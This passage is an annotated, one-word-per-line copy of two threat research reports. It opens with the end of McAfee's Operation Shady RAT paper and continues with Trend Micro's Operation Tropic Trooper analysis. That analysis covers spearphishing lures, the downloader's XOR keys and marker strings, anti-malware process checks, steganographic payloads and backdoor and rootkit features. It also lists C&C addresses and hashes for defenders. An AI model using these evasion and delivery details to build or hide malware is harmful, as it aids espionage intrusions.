aimed
at
specific
victims
may
not
necessarily
be
an
indication
of
a
successful
cleanup
before
a
new
reinfection
,
but
rather
an
artifact
of
our
log
collection
process
that
did
not
mark
every
activity
that
occurred
on
the
adversary
's
infrastructure
,
potentially
leading
to
these
gaps
in
the
data
)

Source
:
McAfee

9

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Source
:
McAfee

10

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Source
:
McAfee

11

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Source
:
McAfee

12

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Source
:
McAfee

Source
:
McAfee

13

White
Paper

Revealed
:
Operation
Shady B_malware.drop
RAT I

Although
Shady B_malware.drop
RAT I
's
scope
and
duration
may
shock
those
who
have
not
been
as
intimately
involved
in
the
investigations
into
these
targeted
espionage
operations
as
we
have
been
,
I
would
like
to
caution
you
that
what
I
have
described
here
has
been
one
specific
operation
conducted
by
a
single
actor/group
.

We
know
of
many
other
successful
targeted
intrusions
(
not
counting
cybercrime-related
ones
)
that
we
are
called
in
to
investigate
almost
weekly
,
which
impact
other
companies
and
industries
.

This
is
a
problem
of
massive
scale
that
affects
nearly
every
industry
and
sector
of
the
economies
of
numerous
countries
,
and
the
only
organizations
that
are
exempt
from
this
threat
are
those
that
do
n't
have
anything
valuable
or
interesting
worth
stealing
.

You
can
follow
Dmitri
Alperovitch
,
vice
president
of
threat
research
,
McAfee
,
on
Twitter
at
http://twitter.com/DmitriCyber B_url.normal
.

Revision
history

Update
:
As
we
've
worked
further
with
the
Korean
Government
on
this
investigation
,
we
have
come
to
a
conclusion
that
a
Korean
Government
agency
was
most
likely
not
a
victim
of
these
intrusions
.

We
are
still
working
to
determine
the
identity
of
the
victim
organization

About
McAfee

McAfee
,
a
wholly
owned
subsidiary
of
Intel
Corporation
(
NASDAQ
:
INTC
)
,
is
the
world
's
largest
dedicated
security
technology
company
.

McAfee
delivers
proactive
and
proven
solutions
and
services
that
help
secure
systems
,
networks
,
and
mobile
devices
around
the
world
,
allowing
users
to
safely
connect
to
the
Internet
,
browse
,
and
shop
the
web
more
securely
.

Backed
by
its
unrivaled
global
threat
intelligence
,
McAfee
creates
innovative
products
that
empower
home
users
,
businesses
,
the
public
sector
,
and
service
providers
by
enabling
them
to
prove
compliance
with
regulations
,
protect
data
,
prevent
disruptions
,
identify
vulnerabilities
,
and
continuously
monitor
and
improve
their
security
.

McAfee
is
relentlessly
focused
on
constantly
finding
new
ways
to
keep
our
customers
safe
.

http://www.mcafee.com B_url.normal

McAfee

2821
Mission
College
Boulevard

Santa
Clara
,
CA

95054
888
847
8766

www.mcafee.com B_url.normal

McAfee
and
the
McAfee
logo
are
registered
trademarks
or
trademarks
of
McAfee
,
Inc
.

or
its
subsidiaries
in
the
United
States
and
other
countries
.

Other
marks
and
brands
may
be
claimed
as
the
property
of
others
.

The
product
plans
,
specifications
and
descriptions
herein
are
provided
for
information
only
and
subject
to
change
without
notice
,
and
are
provided
without
warranty
of
any
kind
,
express
or
implied
.

Copyright
©
2011
McAfee
,
Inc
.

33000wp_shady-rat_0811
Operation
Tropic B_malware.infosteal
Trooper I

Relying
on
Tried-and-Tested
Flaws
to
Infiltrate
Secret
Keepers

Kervin
Alintanahin

Targeted
Attack
Defense
Response
Team

Contents

Introduction
...............................................................................................ii

Targets
.....................................................................................................
1

Campaign
Components
...........................................................................
2

Point
of
Entry
.......................................................................................
2

Initial
Payload
:
TROJ_YAHOYAH B_malware.drop
....................................................
3

Installation
Routine
......................................................................
3

Download
Routine
.......................................................................
4

Maintaining
Persistence
......................................................................
6

Backdoor
Payload
:
BKDR_YAHAMAM B_malware.backdoor
............................................
7

Command-and-Control
Communication
..............................................
7

Lateral
Movement
..............................................................................
10

Possible
Connections
............................................................................
12

Defending
Against
Operation
Tropic B_malware.infosteal
Trooper I
........................................
14

Threat
Intelligence
Gathering
............................................................
14

Download
Links
.............................................................................
14

Strings
...........................................................................................
15

Services
.........................................................................................
15

Solution
Use
......................................................................................
15

Conclusion
...............................................................................................iii

Appendix..................................................................................................iv

Malicious
Files
.....................................................................................iv

References
..............................................................................................vi

TREND
MICRO
LEGAL
DISCLAIMER

The
information
provided
herein
is
for
general
information
and
educational
purposes
only
.

It
is
not
intended
and
should
not
be
construed
to
constitute
legal
advice
.

The
information
contained
herein
may
not
be
applicable
to
all
situations
and
may
not
reflect
the
most
current
situation
.

Nothing
contained
herein
should
be
relied
on
or
acted
upon
without
the
benefit
of
legal
advice
based
on
the
particular
facts
and
circumstances
presented
and
nothing
herein
should
be
construed
otherwise
.

Trend
Micro
reserves
the
right
to
modify
the
contents
of
this
document
at
any
time
without
prior
notice
.

Translations
of
any
material
into
other
languages
are
intended
solely
as
a
convenience
.

Translation
accuracy
is
not
guaranteed
nor
implied
.

If
any
questions
arise
related
to
the
accuracy
of
a
translation
,
please
refer
to
the
original
language
official
version
of
the
document
.

Any
discrepancies
or
differences
created
in
the
translation
are
not
binding
and
have
no
legal
effect
for
compliance
or
enforcement
purposes
.

Although
Trend
Micro
uses
reasonable
efforts
to
include
accurate
and
up-to-date
information
herein
,
Trend
Micro
makes
no
warranties
or
representations
of
any
kind
as
to
its
accuracy
,
currency
,
or
completeness
.

You
agree
that
access
to
and
use
of
and
reliance
on
this
document
and
the
content
thereof
is
at
your
own
risk
.

Trend
Micro
disclaims
all
warranties
of
any
kind
,
express
or
implied
.

Neither
Trend
Micro
nor
any
party
involved
in
creating
,
producing
,
or
delivering
this
document
shall
be
liable
for
any
consequence
,
loss
,
or
damage
,
including
direct
,
indirect
,
special
,
consequential
,
loss
of
business
profits
,
or
special
damages
,
whatsoever
arising
out
of
access
to
,
use
of
,
or
inability
to
use
,
or
in
connection
with
the
use
of
this
document
,
or
any
errors
or
omissions
in
the
content
thereof
.

Use
of
this
information
constitutes
acceptance
for
use
in
an
'as
is
'
condition
.

INTRODUCTION

Taiwan
and
the
Philippines
have
become
the
targets
of
an
ongoing
campaign
called
'Operation
Tropic B_malware.infosteal
Trooper I
.
'

Active
since
2012
,
the
attackers
behind
the
campaign
have
set
their
sights
on
the
Taiwanese
government
as
well
as
a
number
of
companies
in
the
heavy
industry
.

The
same
campaign
has
also
targeted
key
Philippine
military
agencies
.

Though
the
motivations
behind
the
operation
are
still
unclear
,
the
tools
and
tactics
used
reveal
potential
areas
of
weakness
both
countries
should
look
into
.

Operation
Tropic B_malware.infosteal
Trooper I
took
advantage
of
two
of
the
most-exploited
Windows®
vulnerabilities
to
date
—
CVE-2010-3333
and
CVE-2012-0158
—
to
infiltrate
their
chosen
networks
.

Part
of
its
success
could
be
attributed
to
the
use
of
basic
steganography
or
image
file
attachments
laced
with
malicious
code
,
combined
with
clever
social
engineering
.

This
research
paper
provides
in-depth
technical
information
on
Operation
Tropic B_malware.infosteal
Trooper I
's
targets
,
components
,
tools
,
and
tactics
.

*

*
Special
thanks
to
Ronnie
Giagone
for
additional
analyses
and
insights
.

Targets

Malware
used
in
Operation
Tropic B_malware.infosteal
Trooper I
shared
similar
characteristics
with
those
used
in
attacks
targeting
various
organizations
in
Vietnam
and
India
as
early
as
2011
.

[
1
]

Operation
Tropic B_malware.infosteal
Trooper I
targets
government
institutions
,
military
agencies
,
and
companies
in
the
heavy
industry
in
Taiwan
and
the
Philippines
.

[
2
]

Operation
Tropic B_malware.infosteal
Trooper I
campaign
flow

1
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

Campaign
Components

Point
of
Entry

The
actors
behind
Operation
Tropic B_malware.infosteal
Trooper I
used
spearphishing
emails
with
weaponized
attachments
to
exploit
old
vulnerabilities
,
particularly
CVE-2010-3333
and
CVE-2012-0158
.

[
3–5
]

These
bugs
have
been
two
of
the
most
exploited
vulnerabilities
since
their
discovery
.

[
6–7
]

To
infiltrate
target
networks
,
the
attackers
relied
on
crafty
social
engineering
tricks
.

They
used
contextually
relevant
subjects
,
content
,
and
aptly
named
attachments
such
as
'Statement
'
to
convince
chosen
recipients
to
download
and
open
the
files
supposedly
sent
for
review
.

The
following
filenames
were
also
used
:

Spear-phishing
email
sample

•
3AD
28
March
2013
,
SI
re
ASG
Plan
Bombing
in
Zamboanga
City.doc

•
Troops
Disposition
26
FEB
13.doc

•
2nd
qtr
2013
AR
PF15.doc

•
Draft
AS-PH
MLSA
-
v3
DAGTS_CFO_ILOG_DSA
Clean.doc

•
關於104年中央政府總預算.doc
(
translation
:
About
104
years
total
central
government
budget.doc
)

•
實驗室電話表.doc
(
translation
:
Laboratory
telephone
table.doc
)

2
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I
Research
Paper

•
[
REDACTED]自荐信及个人简历.doc
(
translation
:
[
REDACTED
]
cover
letter
and
your
resume.doc
)

Opening
the
attachment
runs
an
embedded
malicious
executable
file
,
normally
a
downloader
that
accesses
a
malicious
site
to
download
an
image
file
.

Some
attachments
open
decoy
documents
to
hide
their
malicious
nature
.

Sample
decoy
documents
(
left
:
for
Filipino
targets
;
right
:
for
Taiwanese
targets
)

Initial
Payload
:
TROJ_YAHOYAH B_malware.drop

The
downloader
typically
attached
to
emails
related
to
Operation
Tropic B_malware.infosteal
Trooper I
is
detected
by
Trend
Micro
as
TROJ_YAHOYAH B_malware.drop
,
a
downloader
with
32-
and
64-bit
support
.

It
has
an
encrypted
configuration
file
and
uses
HTTP
GET
requests
to
download
other
files
that
are
then
decrypted
and
executed
in
memory
.

Installation
Routine

When
executed
,
TROJ_YAHOYAH B_malware.drop
checks
if
the
infected
system
's
Windows
OS
is
64-bit
capable
or
not
.

If
it
is
,
the
Trojan
will
decrypt
a
64-bit
copy
of
itself
using
a
simple
XOR
cipher
with
a
single-byte
key
at
'0x90
.
'

If
the
infected
system
is
not
64-bit
capable
,
the
Trojan
will
just
drop
a
32-bit
executable
copy
of
itself
(
%
APP
DATA
%
\Microsoft\
Credentials\Credentials.exe
,
detected
as
TROJ_YAHOYAH B_malware.drop
)
,
along
with
an
encrypted
configuration
file
(
%
APP
DATA
%
\
Microsoft\Credentials\
Credentials.dat
)
.

The
configuration
file
was
encrypted
using
the
same
simple
algorithm
featured
in
the
previously
cited
Rapid7
report
on
KeyBoy
.

Unlike
the
KeyBoy
Trojan
though
,
which
searches
for
the
string
,
'IJUDHSDJFKJDE
,
'
TROJ_YAHOYAH B_malware.drop
searches
for
'MDDEFGEGETGIZ
.
'

These
strings
,
found
at
the
beginning
of
the
decrypted
code
,
represent
the
configuration
file
.

Absence
of
the
said
file
terminates
the
infection
process
.

Code
that
decrypts
the
configuration
file
using
'0x95,0x99,0x9d,0xc3,0xc7
,
0xcb,0xd7,0xe5,0xbd,0xa9
,
0xb5,0xeb,0xf7,0xe3,0xe7
,
0xed
'
as
key

3
|
Page

©
2015
Trend
Micro
Incorporated

•
NA
:
Checks
for
the
system
's
hostname

•
VR
:
Hard-coded
string
only
used
when
accessing
download
sites
to
track
which
downloader
was
used
on
a
target
.

HTTP
GET
request
sample

TROJ_YAHOYAH B_malware.drop
checks
for
the
following
antimalware
solution
processes
:

•
360rp.exe

•
360tray.exe

•
ALMon.exe

•
ALsvc.exe

•
ashserv.exe

•
Avastsvc.exe

•
avgam.exe

•
avguard.exe

•
avp.exe

•
avpmapp.exe

•
CyberoamClient.exe

•
econceal.exe

•
econser.exe

•
ekrn.exe

•
escanmon.exe

•
consctl.exe

TROJ_YAHOYAH B_malware.drop
's
decrypted
configuration
file

TROJ_YAHOYAH B_malware.drop
's
configuration
file
,
when
decrypted
,
contains
the
links
to
sites
from
which
it
can
download
the
files
it
needs
to
continue
its
routines
.

After
decryption
,
it
executes
a
dropped
copy
using
the
-Embedding
parameter
then
attempts
to
delete
itself
.

The
downloader
's
name
was
inspired
by
its
self-deletion
routine
after
dropping
its
payload
.

YAHOYAH
was
derived
from
the
Visayan
term
'hayohay
,
'
which
loosely
translates
to
an
easily
discarded
'servant
'
in
English
.

[
8
]

Download
Routine

TROJ_YAHOYAH B_malware.drop
attempts
to
access
links
and
download
files
via
HTTP
GET
requests
.

To
move
to
another
attack
phase
,
it
uses
the
following
user-agent
strings
:

•
MSIE
:
Checks
for
the
system
's
Internet
Explorer®
version

•
NT
:
Checks
for
the
system
's
Windows
OS
version

•
AV
:
Checks
for
installed
antimalware
solutions

•
OV
:
Checks
for
the
system
's
MicrosoftTM
Office®
version

4
|
Page

©
2015
Trend
Micro
Incorporated

•
mcshield.exe

•
nod32krn.exe

•
pccntmon.exe

•
SAVAdminService.exe

•
SavService.exe

•
sfctlcom.exe

•
swi_service.exe

•
uiwatchdog.exe

TROJ_YAHOYAH B_malware.drop
temporarily
saves
downloaded
files
in
a
specially
created
folder
named
'
%
APP
DATA
%
\
tasks\up
{
random
characters}.msi
.
'

Sample
.MSI
file
with
a
malicious
.JPG
header

Sample
.MSI
file
opened
on
Microsoft
Paint

The
image
is
supposed
to
be
an
800
x
600
wallpaper
that
is
way
heavier
than
the
real
one
named
'Wind.jpg
'
normally
found
in
Windows
XP
systems
'
%
WINDOWS
%
\wallpaper\web
folder
.

The
actors
behind
Operation
Tropic B_malware.infosteal
Trooper I
may
be
using
a
simple
steganography
technique
to
mask
the
backdoor
's
routines
in
order
to
evade
antimalware
and
network
perimeter
detection
.

[
9
]

We
have
seen
the
actors
use
other
images
found
in
the
same
folder
such
as
'Ascent.jpg
,
'
'Friend.jpg
,
'
and
'Home.jpg
.
'

5
|
Page

©
2015
Trend
Micro
Incorporated

A
more
in-depth
analysis
of
the
downloaded
file
reveals
that
malicious
code
has
been
appended
to
it
.

This
allows
TROJ_YAHOYAH B_malware.drop
to
check
offset
0x0F
bytes
from
the
end
of
the
file
code
to
identify
a
marker
where
the
malicious
binary
code
will
be
added
,
thus
increasing
the
file
's
size
.

TROJ_YAHOYAH B_malware.drop
looks
for
the
string
,
'EHAGBPSL
,
'
and
decrypts
the
appended
binary
code
.

When
decrypted
,
an
.EXE
file
is
executed
in
memory
.

It
automatically
runs
if
the
user
has
administrator
privileges
.

If
the
user
has
limited
privileges
though
,
it
will
first
attempt
to
obtain
administrator
privileges
by
bypassing
User
Account
Control
(
UAC
)
but
only
on
Windows
7
.

It
will
then
decrypt
another
XOR-encrypted
file
using
the
key
'0x90
'
in
memory
then
check
if
the
'StartWork
'
function
was
exported
then
execute
it
.

Other
images
used
in
attacks

Malicious
code
appended
to
that
of
the
.JPG
file

Maintaining
Persistence

The
last
file
that
TROJ_YAHOYAH B_malware.drop
executes
in
memory
is
the
main
installer
.

It
contains
two
more
files
that
install
a
.DLL
file
detected
as
TROJ_YAHAMAM B_malware.backdoor
.

This
file
is
registered
as
a
service
named
'INCS
'
to
maintain
persistence
.

It
also
drops
the
following
XOR-encrypted
malware-laced
image
files
:

•
%
windows
%
\System32\mfc41.dll
(
detected
as
TROJ_YAHAMAM B_malware.backdoor
)

•
%
windows
%
\inf\mfc41.inf
(
a
configuration
file
)

•
%
windows
%
\Fonts\mfc41.tff
(
a
copy
of
the
configuration
file
)

•
%
windows
%
\Web
Wallpaper\images.jpg
(
contains
BKDR_YAHAMAM B_malware.backdoor
)

A
batch
(
.BAT
)
file
is
used
to
start
the
INCS
service
.

TROJ_YAHAMAM B_malware.backdoor
uses
a
trick
similar
to
that
of
TROJ_YAHOYAH B_malware.drop
in
order
to
decrypt
files
.

When
decrypted
,
TROJ_YAHAMAM B_malware.backdoor
executes
the
backdoor
payload
.

6
|
Page

©
2015
Trend
Micro
Incorporated

Backdoor
Payload
:
BKDR_ B_malware.backdoor
YAHAMAM I

BKDR_YAHAMAM B_malware.backdoor
is
usually
encrypted
then
embedded
in
an
image
file
.

When
decrypted
,
it
is
loaded
and
executed
in
memory
by
a
.DLL
file
that
is
registered
as
a
service
(
TROJ_YAHAMAM B_malware.backdoor
)
.

It
exfiltrates
data
from
infected
systems
,
downloads
and
uploads
files
,
and
has
a
remote
shell
.

It
also
drops
a
rootkit
component
named
'usb.sys
,
'
detected
as
RTKT_HIDEPORT.ZTCA-XO
.

The
rootkit
creates
the
service
,
usb30
,
and
hides
evidence
of
port
communication
to
evade
detection
and
remain
persistent
.

Command-and-Control
Communication

When
executed
,
BKDR_YAHAMAM B_malware.backdoor
checks
if
it
runs
under
svchost.exe
.

It
uses
the
configuration
file
,
%
windows
%
\Fonts\mfc41.tff
,
which
contains
the
following
information
:

•
C
&
C1

•
C
&
C2

•
C
&
C3

•
ControlPort

•
DownloadURL1

•
DownloadURL2

•
DownloadURL3

•
LoginPass
(
for
authentication
purposes
)

•
Port1

•
Port2

•
Port3

•
USB

•
UserMark

BKDR_YAHAMAM B_malware.backdoor
encrypts
C
&
C
communication
using
multiplication
with
a
1-byte
key
.

Attackers
can
use
the
'
?
'

and
'
Help
'
commands
to
see
the
various
options
the
backdoor
offers
as
shown
in
its
code
.

Tool
used
to
emulate
command-and-control
(
C
&
C
)
communication
with
a
64-bit
version
of
BKDR_ B_malware.backdoor
YAHAMAM I

We
were
able
to
download
some
files
from
two
of
the
C
&
C
servers
that
TROJ_YAHAMAM B_malware.backdoor
accesses
.

These
had
some
image
files
that
the
32-
and
64-bit
versions
of
the
backdoor
can
choose
from
for
use
in
attacks
.

7
|
Page

©
2015
Trend
Micro
Incorporated

8
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

The
following
table
lists
the
unique
SHA-1
hashes
that
TROJ_YAHAMAM B_malware.backdoor
downloads
,
along
with
their
backdoor
payloads
.

C
&
C
servers
TROJ_YAHAMAM B_malware.backdoor
accesses
to
download
malicious
payloads

Filename

SHA-1

Hash

Backdoor
Payload

Trend
Micro
Detection
Name

3.jpg

32.jpg

bd2015.24.jpg

lclc_0725.jpg

c5359ecc1651a98125bf7ea2668f85af64a7a533 B_hash

HL3.7x86_20140711

BKDR_YAHAMAM B_malware.backdoor

872cbe46a84fb88836db2a15e92d8c80d4209af3 B_hash

HL3.7x86_20150122

BKDR_YAHAMAM B_malware.backdoor

8ee9bdab29970c95f9ed5915813543609b7f438c B_hash

HL3.7x86_20150122

BKDR_YAHAMAM B_malware.backdoor

fedb2c7b5f6a11ddefd29eb034e85f17c612e3ba B_hash

HL3.7x86_20140508

BKDR_YAHAMAM B_malware.backdoor

SmartNavport0205.32.gif

75940e926894b65652bb84d96fe42fe709a183f5 B_hash

HL3.7x86_20150122

BKDR_YAHAMAM B_malware.backdoor

ualband.24.jpg

6d82e1aafd910b93ebf2ece773d43e9ccbbf84f3 B_hash

HL3.7x64_20140711

BKDR_YAHAMAM B_malware.backdoor

Interestingly
,
a
BKDR_POISON
variant
was
found
on
the
sites
'
folders
as
well
,
leading
us
to
believe
that
the
attackers
also
use
it
for
Operation
Tropic B_malware.infosteal
Trooper I
.

9
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

Filename

SHA-1
Hash

Trend
Micro
Detection
Name

wshif.dll

wship.dll

a7b4381b1f9161992b358eda9bd58a6b219a13d3 B_hash

BKDR_POISON.TUFN

4eedf918aeb1a2bedc6278e89ebf3005d0b95d41 B_hash

BKDR_POISON.TUFN

BKDR_YAHAMAM B_malware.backdoor
can
steal
practically
any
type
of
file
saved
on
infected
systems
.

Apart
from
stealing
data
,
it
can
also
perform
more
harmful
actions
like
kill
processes
and
services
,
delete
files
and
directories
,
and
put
systems
to
sleep
,
among
others
.

BKDR_YAHAMAM B_malware.backdoor
also
attempts
to
install
an
accompanying
executable
rootkit
(
%
windows
%
\system32\
drivers\usb30.sys
,
detected
as
RTKT_HIDEPORT.ZTCA-XO
)
.

RTKT_HIDEPORT.ZTCA-XO
is
also
XOR
encrypted
and
found
at
byte
key
,
'0x90
,
'
to
hide
the
port
that
the
backdoor
should
use
according
to
the
configuration
file
.

It
will
only
hide
communication
activities
occurring
in
the
first
of
three
port
entries
indicated
in
the
configuration
file
.

After
creating
and
starting
the
rootkit
service
,
BKDR_YAHAMAM B_malware.backdoor
then
attempts
to
delete
the
rootkit
and
the
related
service
.

This
will
not
stop
the
rootkit
from
running
in
the
background
.

BKDR_YAHAMAM B_malware.backdoor
variants
with
rootkits
for
32-bit
systems
run
on
32-bit
versions
of
Windows
XP
.

On
Windows
7
64-bit
systems
,
however
,
the
backdoor
works
but
the
rootkit
does
not
.

Lateral
Movement

In
the
course
of
doing
research
,
we
also
managed
to
get
hold
of
the
following
tools
that
the
actors
behind
Operation
Tropic B_malware.infosteal
Trooper I
used
in
an
attack
:

•
HKTL_GETOS
:
Detects
a
target
system
's
OS
version
.

[
10
]

•
HKTL_SHARESCAN
:
Performs
the
following
:

-pr
:
Scans
for
open
ports
on
target
systems
.

-letmein
:
Scans
for
saved
usernames
and
passwords
on
target
systems
.

-arp
:
Views
the
Address
Resolution
Protocol
(
ARP
)
on
each
target
system
.

-netview
:
Scans
target
systems
for
shared
resources
.

HKTL_GETOS
's
OS-version-sniffing
routine

10
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

HKTL_SHARESCAN
's
routines
(
top
left
:
-pr
;
top
right
:
-letmein
;
bottom
left
:
-arp
;
bottom
right
:
-netview

These
hacking
tools
were
possibly
remotely
downloaded
by
the
attackers
onto
infected
systems
.

They
aided
in
lateral
movement
and
further
intelligence
gathering
.

Data
such
as
credentials
saved
on
infected
systems
can
be
stolen
via
Address
Resolution
Protocol
(
ARP
)
poisoning
or
main-in-the-middle
(
MiTM
)
Layer
2
and
pass-the-hash
attacks
.

[
11–12
]

The
stolen
credentials
allow
attackers
laterally
move
throughout
a
network
.

The
threat
actors
no
longer
have
to
hack
their
way
in
,
they
have
the
ability
to
log
in
as
legitimate
users
.

11
|
Page

©
2015
Trend
Micro
Incorporated

Possible
Connections

Based
on
the
specially
crafted
documents
we
were
able
to
gather
,
Operation
Tropic B_malware.infosteal
Trooper I
has
been
active
since
2012
.

We
have
seen
malware
samples
from
2011
that
behaved
the
same
way
and
used
similar
file
markers
.

[
13
]

The
following
table
provides
more
detailed
information
on
Operation
Tropic B_malware.infosteal
Trooper I
's
downloader
,
TROJ_YAHOYAH B_malware.drop
.

SHA-1
Hash

Campaign
ID
HardCoded
into
Malware

17ee08b92aeefb8d3d73a02beb03e634b453b5fe B_hash

PH4.0
Q20121012

3a8bed630679a30c8f945a7f9fe9eef18dd18ef8 B_hash

PH4.0
Q20131218

3ff3519749764f64f5f208347f39bd77f7e2fa92 B_hash

PH4.0
Q20130527

47747dccd1fc57a6456cf2a06d654966193545e5 B_hash

PH4.0
Q20120730

542ca28d4154e4e4382f9dfe4e0C37983046e93d B_hash

PH4.0
Q20131218

56680180af5a792dca8e6112c57810b5e06bca1b B_hash

PH4.0
Q20120730

593ab027f90d8651e685581b8f09d87a2c95f244 B_hash

PH4.0
Q20140723

5c5a4ceea45c3f0e67085b9d323da13eedcf6e1b B_hash

PH4.0
Q20121012

6099001d54d39bcdd7c874672e8b28789e79721f B_hash

PH4.0
Q20121012

7d5fd316f12ff39e5a9b43dabd66eccdcdb164e7 B_hash

PH4.0
Q20141104

12
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

SHA-1
Hash

Campaign
ID
HardCoded
into
Malware

973e522edeb08bea948098ce7c8b83866857de9c B_hash

PH4.0
Q20130527

aef101fb24bd39e3cc14c26796c0336f2cb1d540 B_hash

PH4.0
Q20131218

b1fdb46cbe73cc14f784bebac47e33606b259967 B_hash

PH4.0
Q20121012

b767e1325bf103e672183e9487093ac068b75bc8 B_hash

PH4.0
Q20140723

ba71031ec0dccf09fbc48af61a22e5faa6b055a4 B_hash

PH4.0
Q20140910

bb8fddcd993a3ca94c6dd583f36df76bb5227ca5 B_hash

PH4.0
Q20130527

c4ae20ef0a90f095a88a9ea9920e97733a4d5626 B_hash

PH4.0
Q20141104

d50c657ff3068bd03ef74cfa5a289bbda87f33ef B_hash

PH4.0
Q20121012

f8ac7ccf99485f485a435e05420bf3c103a3a549 B_hash

PH4.0
Q20131218

13
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

Defending
Against
Operation
Tropic B_malware.infosteal
Trooper I

Threat
Intelligence
Gathering

Network
and
system
administrators
can
protect
against
Operation
Tropic B_malware.infosteal
Trooper I
by
blocking
user
access
to
related
C
&
C
servers
.

They
should
also
keep
an
eye
out
for
related
strings
as
well
as
services
and
their
corresponding
paths
.

Download
Links

TROJ_YAHOYAH B_malware.drop
downloads
the
following
image
files
:

•
113.10.183.104/imgs/phh121018.jpg

•
113.10.221.89/images/kong.jpg

•
113.10.221.89/images/phonedpp.jpg

•
113.10.221.89/Pictures/dzh_0925.jpg

•
113.10.221.89/underwater.jpg

•
173.252.220.169/underwater.jpg

•
198.211.3.83/images/ph06.jpg

•
202.153.193.73/images/kong.jpg

•
202.153.193.73/images/phonedpp.jpg

•
208.187.167.126/images/dfsy.jpg

•
208.187.167.126:88/images/dmjs.jpg

•
208.187.167.126/images/phzy.jpg

•
50.117.38.164/Pictures/dzh_0925.jpg

•
61.218.145.179/monitor/images/
Smartxy130619.gif

•
61.221.169.31/images/kongj.jpg

•
61.221.169.31/images/phonedpp.jpg

•
61.222.31.83/monitor/images/Smartxy130619.gif

•
69.221.169.31/underwater.jpg

14
|
Page

©
2015
Trend
Micro
Incorporated

info.acmetoy.com/imgs/phh121018.jpg

•
air88.ddns.us/images/af130218.jpg

•
air88.ddns.us/js/af130901.jpg

•
air88.ns01.us:53/js/af130901.jpg

•
air88.ns01.us/images/af130218.jpg

•
air88.ns01.us:53/js/af130901.jpg

•
air99.ns01.us/js/af130901.jpg

•
msc.ddns.us:443/images/ph06.jpg

•
nevermore.onmypc.org/images/ph06.jpg

•
ph11.dns1.us:53/images/phzy.jpg

•
ph11.dns1.us/images/dfsy.jpg

•
ph11.dns1.us/images/dmjs.jpg

•
ph11.ns01.us:443/images/phzy.jpg

•
ph11.ns01.us:5050/images/dmjs.jpg

•
ph11.ns01.us/images/dfsy.jpg

•
ware.compress.to/imgs/phh121018.jpg

•
www . amberisic611 . 4dq . com
/
monitor
/
images
/
Smartzh140222 . gif

•
www . bannered . 4dq . com
/
monitor
/
images
/
Smartzh131225 . gif

Strings

TROJ_YAHOYAH B_malware.drop
looks
for
the
following
strings
to
continue
performing
its
malicious
routines
:

•
EHAGBPSL

•
MDDEFGEGETGIZ

Services

Network
and
system
administrators
can
also
look
out
for
the
following
services
,
which
are
related
to
TROJ_
YAHAMAM
:

•
ServiceName
:
INCS

DisplayName
:
IPSEC
Network
Connections
Services
;

ImagePath
:
%
SystemRoot
%
\System32\
svchost.exe
-k
incsvc

•
ServiceName
:
usb30

DisplayName
:
usb30

ImagePath
:
%
SystemRoot
%
\\System32\
DRIVERS\usb30.sys

•
www . bannered . 4dq . com
/
monitor
/
images
/
Smartzh140222 . gif
Solution
Use

•
www . cham . com . tw
/
images
/
dzh
_
0925 . jpg

•
www . forensic611 . 3
-
a . net
/
monitor
/
images
/
Smartzh131225 . gif

•
www . forensic611 . 3
-
a . net
/
monitor
/
images
/
Smartxy130619 . gif

•
www . forensic . zyns . com
/
monitor
/
images
/
Smartzh131225 . gif

•
www . metacu . ygto . com
/
monitor
/
images
/
Smartzh140222 . gif

We
also
recommend
a
Custom
Defense
strategy
that
uses
a
comprehensive
'Detect—Analyze—
Respond
'
life
cycle
to
address
threats
particular
to
an
organization
.

This
can
provide
in-depth
threat
profile
information
as
well
as
advanced
threat
detection
at
the
network
level
to
discover
malicious
content
(
malware
)
,
communication
,
and
attacker
activity
that
are
not
typically
visible
to
traditional
security
solutions
.

15
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

The
following
table
shows
how
a
custom
defense
solution
such
as
Trend
MicroTM
Deep
Discovery
can
aid
in
detecting
the
components
of
Operation
Tropic B_malware.infosteal
Trooper I
.

Attack
Component

Deep
Discovery
Component

Description

Spear-phishing
emails

Email
Inspector

Malicious
image
files

Analyzer

Malware

•
BKDR_POISON.TUFN

•
BKDR_YAHAMAM B_malware.backdoor

•
RTKT_HIDEPORT.ZTCA-XO

•
TROJ_YAHOYAH B_malware.drop

Analyzer

Inspector

Detects
spear-phishing
emails
used
to
infiltrate
,
establish
a
foothold
in
,
and
launch
targeted
attacks
against
targets
;
has
email-inspection
capabilities
that
detect
malicious
content
,
attachments
,
and
URLs
that
pass
unnoticed
through
standard
email
security
solutions

Detects
even
previously
unknown
threats
by
analyzing
a
broad
range
of
file
types
,
sizes
,
and
sources
using
customizable
sandbox
environments
that
attackers
design
and
build
to
match
organization
's
desktop
and
device
platforms

Detects
even
previously
unknown
threats
by
analyzing
a
broad
range
of
file
types
,
sizes
,
and
sources
using
customizable
sandbox
environments
that
attackers
design
and
build
to
match
organization
's
desktop
and
device
platforms

Identifies
suspicious
activities
anywhere
on
networks
,
including
those
related
to
lateral
movement
and
C
&
C
;

also
detects
traffic
generated
by
malware-download-related
behaviors
via
HTTP
GET
requests

16
|
Page

©
2015
Trend
Micro
Incorporated

Operation
Tropic B_malware.infosteal
Trooper I

Research
Paper

CONCLUSION

Operation
Tropic B_malware.infosteal
Trooper I
is
not
highly
sophisticated
.

But
the
fact
that
it
has
attained
some
degree
of
success
and
has
managed
to
infiltrate
crucial
organizations
in
both
Taiwan
and
the
Philippines
shows
the
urgent
need
for
targeted
entities
to
rectify
their
shortcomings
in
terms
of
security
.

As
with
other
targeted
attacks
,
Operation
Tropic B_malware.infosteal
Trooper I
brings
great
risks
,
especially
since
its
targets
include
government
institutions
and
military
agencies
.

Although
we
were
not
able
to
